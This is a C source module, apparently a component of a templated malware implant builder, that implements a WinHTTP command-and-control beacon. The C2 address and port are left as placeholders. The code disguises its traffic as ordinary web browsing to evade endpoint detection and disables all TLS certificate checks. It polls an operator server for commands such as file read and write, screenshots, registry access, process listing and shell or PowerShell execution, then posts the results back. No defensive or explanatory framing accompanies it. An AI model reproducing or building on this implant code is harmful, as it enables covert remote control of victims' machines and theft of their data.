// chunk: c2/winhttp_beacon
// depends: core/emit_buffer
// provides: c2_hdr_t, g_c2_sock, c2_connect, c2_disconnect, c2_recv_cmd, c2_send_result, c2_heartbeat
// headers: winhttp.h, stdint.h
// libs: winhttp
// note: WinHTTP bidirectional C2 — looks like normal web traffic to EDR

#ifndef CHUNK_C2_WINHTTP_BEACON
#define CHUNK_C2_WINHTTP_BEACON

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100
#endif
#ifndef SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE 0x00000200
#endif
#ifndef SECURITY_FLAG_IGNORE_CERT_CN_INVALID
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID 0x00001000
#endif
#ifndef SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#endif
#ifndef SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
#endif

#pragma pack(push, 1)
typedef struct { uint32_t cmd_id; uint32_t payload_len; } c2_hdr_t;
#pragma pack(pop)

#define C2_CMD_HEARTBEAT    0x01
#define C2_CMD_SYSINFO      0x02
#define C2_CMD_PROCESSES    0x03
#define C2_CMD_FILELIST     0x04
#define C2_CMD_FILEREAD     0x05
#define C2_CMD_FILEWRITE    0x06
#define C2_CMD_SCREENSHOT   0x07
#define C2_CMD_REGISTRY     0x08
#define C2_CMD_NETINFO      0x09
#define C2_CMD_EXEC         0x0A
#define C2_CMD_EXEC_PS      0x0B
#define C2_CMD_EXIT         0x0D
#define C2_CMD_NOOP         0xFF

static HINTERNET g_http_session = NULL;
static HINTERNET g_http_connect = NULL;
static int g_c2_sock = 0; /* dummy for recipe compat */

static int c2_connect(const char *ip, int port) {
    g_http_session = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                                 WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_http_session) return 0;

    wchar_t wip[64] = {0};
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wip, 64);

    g_http_connect = WinHttpConnect(g_http_session, wip, (INTERNET_PORT)port, 0);
    if (!g_http_connect) {
        WinHttpCloseHandle(g_http_session);
        g_http_session = NULL;
        return 0;
    }
    return 1;
}

static void c2_disconnect(void) {
    if (g_http_connect) { WinHttpCloseHandle(g_http_connect); g_http_connect = NULL; }
    if (g_http_session) { WinHttpCloseHandle(g_http_session); g_http_session = NULL; }
}

static int http_post(const wchar_t *path, const char *body, DWORD body_len,
                     char *resp, DWORD resp_max, DWORD *resp_len) {
    *resp_len = 0;
    HINTERNET hReq = WinHttpOpenRequest(g_http_connect, L"POST", path,
                                         NULL, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         WINHTTP_FLAG_BYPASS_PROXY_CACHE);
    if (!hReq) return 0;

    DWORD flags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    BOOL ok = WinHttpSendRequest(hReq, L"Content-Type: application/octet-stream\r\n",
                                  -1L, (LPVOID)body, body_len, body_len, 0);
    if (!ok) { WinHttpCloseHandle(hReq); return 0; }

    ok = WinHttpReceiveResponse(hReq, NULL);
    if (!ok) { WinHttpCloseHandle(hReq); return 0; }

    DWORD total = 0, rd = 0;
    while (WinHttpReadData(hReq, resp + total, resp_max - total, &rd) && rd > 0) {
        total += rd;
        if (total >= resp_max) break;
    }
    *resp_len = total;
    WinHttpCloseHandle(hReq);
    return 1;
}

static int c2_recv_cmd(c2_hdr_t *hdr, char *payload, DWORD max_len) {
    char resp[1024 * 1024];
    DWORD resp_len = 0;

    c2_hdr_t beat;
    beat.cmd_id = C2_CMD_HEARTBEAT;
    DWORD tick = GetTickCount();
    beat.payload_len = sizeof(tick);

    char body[sizeof(c2_hdr_t) + sizeof(tick)];
    memcpy(body, &beat, sizeof(beat));
    memcpy(body + sizeof(beat), &tick, sizeof(tick));

    if (!http_post(L"/beacon", body, sizeof(body), resp, sizeof(resp), &resp_len))
        return 0;

    if (resp_len < sizeof(c2_hdr_t)) {
        hdr->cmd_id = C2_CMD_NOOP;
        hdr->payload_len = 0;
        return 1;
    }

    memcpy(hdr, resp, sizeof(c2_hdr_t));
    if (hdr->payload_len > 0 && hdr->payload_len <= max_len &&
        resp_len >= sizeof(c2_hdr_t) + hdr->payload_len) {
        memcpy(payload, resp + sizeof(c2_hdr_t), hdr->payload_len);
    }
    return 1;
}

static int c2_send_result(uint32_t cmd_id, const char *data, DWORD len) {
    DWORD total = sizeof(c2_hdr_t) + len;
    char *body = (char *)malloc(total);
    if (!body) return 0;

    c2_hdr_t hdr;
    hdr.cmd_id = cmd_id;
    hdr.payload_len = len;
    memcpy(body, &hdr, sizeof(hdr));
    if (len > 0 && data) memcpy(body + sizeof(hdr), data, len);

    char resp[64];
    DWORD resp_len = 0;
    int ok = http_post(L"/result", body, total, resp, sizeof(resp), &resp_len);
    free(body);
    return ok;
}

static int c2_heartbeat(void) {
    DWORD tick = GetTickCount();
    return c2_send_result(C2_CMD_HEARTBEAT, (const char *)&tick, sizeof(tick));
}

#endif
